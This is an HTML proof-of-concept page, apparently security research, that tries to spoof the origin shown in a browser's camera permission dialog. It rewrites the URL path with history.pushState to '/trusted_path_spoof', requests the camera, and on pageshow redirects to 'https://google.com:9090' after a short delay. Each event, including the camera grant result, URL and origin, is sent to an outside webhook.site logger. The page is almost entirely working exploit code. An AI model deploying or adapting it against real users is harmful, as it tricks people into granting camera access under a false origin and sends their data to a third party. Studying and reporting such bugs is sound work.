<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>PoC Camera Permission Research</title>

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 12px 18px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: white;
  cursor: pointer;
  font-weight: 600;
}

button:active {
  background: #0056b3;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: white;
  padding: 24px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.15);
  text-align: center;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #b00020;
}

video {
  margin-top: 16px;
  width: 100%;
  border-radius: 12px;
  background: #000;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
    <button id="trigger">Start PoC</button>
</div>

<div id="panel">

<h2>Request Camera</h2>

<p>Tap the button below to request Camera permission.</p>

<button onclick="getCamera()">Open Camera</button>

<p id="output">Camera: -</p>

<video id="preview" autoplay playsinline muted></video>

<div class="notice">
Demo only — observe origin shown in permission dialog.
</div>

</div>

<script>

const LOG_ENDPOINT = "https://webhook.site/9de41a71-f12f-4d4c-8fe4-6a3a787c0750";

function logEvent(type, extra = {}) {

    const data = {
        type,
        ts: performance.now().toFixed(3),
        epoch: Date.now(),
        url: location.href,
        origin: location.origin,
        visibility: document.visibilityState,
        readyState: document.readyState,
        ...extra
    };

    const img = new Image();

    img.src =
        LOG_ENDPOINT +
        "?" +
        new URLSearchParams(data).toString();
}

const panel = document.getElementById("panel");
const trigger = document.getElementById("trigger");
const output = document.getElementById("output");
const preview = document.getElementById("preview");

async function getCamera() {

    if (!navigator.mediaDevices ||
        !navigator.mediaDevices.getUserMedia) {

        output.textContent =
            "Camera API not supported";

        return;
    }

    logEvent("camera_requested");

    try {

        const stream =
            await navigator.mediaDevices.getUserMedia({
                video: true
            });

        logEvent("camera_success", {
            tracks: stream.getVideoTracks().length
        });

        preview.srcObject = stream;

        output.textContent =
            "Camera permission granted";

        // hentikan kamera setelah 2 detik
        setTimeout(() => {

            stream.getTracks().forEach(track => track.stop());

            preview.srcObject = null;

            logEvent("camera_stopped");

        }, 2000);

    } catch (err) {

        logEvent("camera_error", {
            name: err.name,
            message: err.message
        });

        output.textContent =
            err.name;

    }

}

trigger.onclick = () => {

    logEvent("poc_started");

    history.pushState({}, "", "/trusted_path_spoof");

    logEvent("pushstate_done", {
        newPath: location.pathname
    });

    panel.style.display = "block";
    trigger.style.display = "none";

};

window.addEventListener("pageshow", event => {

    logEvent("pageshow", {
        persisted: event.persisted
    });

    requestAnimationFrame(() => {

        requestAnimationFrame(() => {

            setTimeout(() => {

                const target =
                    "https://google.com:9090";

                logEvent("navigation_triggered", {
                    target
                });

                location.href = target;

            }, 50);

        });

    });

});

</script>

</body>
</html>
